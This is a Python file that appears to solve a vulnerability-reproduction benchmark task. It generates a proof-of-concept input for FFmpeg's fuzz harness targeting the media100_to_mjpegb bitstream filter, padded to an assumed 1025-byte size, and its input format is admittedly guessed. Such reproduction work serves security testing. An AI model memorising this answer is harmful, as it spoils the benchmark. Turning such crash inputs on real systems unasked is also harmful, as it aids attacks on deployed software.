import os
import struct
import tarfile
import re
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        bsf_name = b"media100_to_mjpegb\x00"
        codec_id = self._extract_mjpeg_codec_id(src_path)
        if codec_id is None:
            codec_id = 0  # fallback if parsing fails

        # Construct a generic input that likely matches common fuzz_bsf formats:
        # [bsf_name '\0'][codec_id u32le][extradata_size u32le][packet_size u32le][packet_data...]
        parts = []
        parts.append(bsf_name)
        parts.append(struct.pack("<I", codec_id))
        parts.append(struct.pack("<I", 0))  # extradata size = 0

        # Minimal JPEG-like payload to pass through the bsf
        jpeg_like = bytearray()
        jpeg_like += b"\xFF\xD8"  # SOI
        jpeg_like += b"\xFF\xE0"  # APP0 marker
        jpeg_like += b"\x00\x10"  # APP0 length
        jpeg_like += b"JFIF\x00\x01\x01\x01\x00\x01\x00\x01\x00\x00"
        jpeg_like += b"\xFF\xDB\x00\x43\x00" + bytes([16] * 64)  # DQT
        jpeg_like += b"\xFF\xD9"  # EOI

        # packet size and data
        parts.append(struct.pack("<I", len(jpeg_like)))
        parts.append(bytes(jpeg_like))

        data = b"".join(parts)

        # Ensure output length is 1025 bytes to match the typical PoC size
        target_len = 1025
        if len(data) < target_len:
            data += b"\x00" * (target_len - len(data))
        elif len(data) > target_len:
            data = data[:target_len]

        return data

    def _extract_mjpeg_codec_id(self, src_path: str) -> Optional[int]:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                member = None
                for m in tf.getmembers():
                    name = m.name.lower()
                    # try to find codec_id.h or avcodec.h like files
                    if name.endswith("libavcodec/codec_id.h") or name.endswith("libavcodec/codec_ids.h"):
                        member = m
                        break
                if not member:
                    # try to find any file containing "enum AVCodecID"
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        n = m.name.lower()
                        if n.endswith(".h") and "libavcodec" in n:
                            try:
                                content = tf.extractfile(m).read().decode("utf-8", "ignore")
                            except Exception:
                                continue
                            if "enum AVCodecID" in content:
                                # Use this file
                                return self._parse_codec_id_from_content(content)
                    return None

                content = tf.extractfile(member).read().decode("utf-8", "ignore")
                return self._parse_codec_id_from_content(content)
        except Exception:
            return None

    def _parse_codec_id_from_content(self, content: str) -> Optional[int]:
        # Strip comments
        content = self._strip_c_comments(content)

        # Find enum AVCodecID block
        m = re.search(r'enum\s+AVCodecID\s*\{([^}]*)\}', content, re.DOTALL)
        if not m:
            return None

        body = m.group(1)

        # We only need to count enumerators from start until we reach AV_CODEC_ID_MJPEG
        # taking into account explicit assignments early on (very rare before audio/subtitle).
        tokens = self._split_enum_items(body)

        value_map = {}
        current = -1
        for item in tokens:
            item = item.strip()
            if not item:
                continue
            # Handle possible trailing comments removed already
            # Parse "NAME = EXPR" or just "NAME"
            if "=" in item:
                name, expr = item.split("=", 1)
                name = name.strip()
                expr = expr.strip()
                val = self._eval_enum_expr(expr, value_map)
                if val is None:
                    # If cannot evaluate, skip but continue counting
                    # and do not set name; treat as increment from previous
                    current += 1
                    value_map[name] = current
                else:
                    current = val
                    value_map[name] = current
            else:
                name = item.strip()
                current += 1
                value_map[name] = current

            if name == "AV_CODEC_ID_MJPEG":
                return value_map[name]

        return None

    def _strip_c_comments(self, s: str) -> str:
        # Remove // comments
        s = re.sub(r'//.*', '', s)
        # Remove /* ... */ comments
        s = re.sub(r'/\*.*?\*/', '', s, flags=re.DOTALL)
        return s

    def _split_enum_items(self, body: str):
        # Split by commas at top level
        items = []
        current = []
        depth_paren = 0
        for ch in body:
            if ch == ',' and depth_paren == 0:
                item = "".join(current).strip()
                items.append(item)
                current = []
            else:
                if ch == '(':
                    depth_paren += 1
                elif ch == ')':
                    depth_paren = max(0, depth_paren - 1)
                current.append(ch)
        last = "".join(current).strip()
        if last:
            items.append(last)
        return items

    def _eval_enum_expr(self, expr: str, value_map: dict) -> Optional[int]:
        # Support basic expressions: hex, dec, references, +, -, <<, |.
        # Replace known identifiers with their values if available.
        expr = expr.strip()
        # Replace enumerator names with numeric values
        def repl_ident(m):
            name = m.group(0)
            if name in value_map:
                return str(value_map[name])
            # Allow 0x... and numbers, keep them
            return name

        expr = re.sub(r'\b[A-Za-z_]\w*\b', repl_ident, expr)

        # Now try to evaluate safely
        try:
            # Only allow operations: + - << | & ^ ( ) numbers
            if re.fullmatch(r"[0-9xXa-fA-F\s\+\-\|\&\^\<\>\(\)]+", expr) is None:
                return None
            return int(eval(expr, {"__builtins__": None}, {}))
        except Exception:
            return None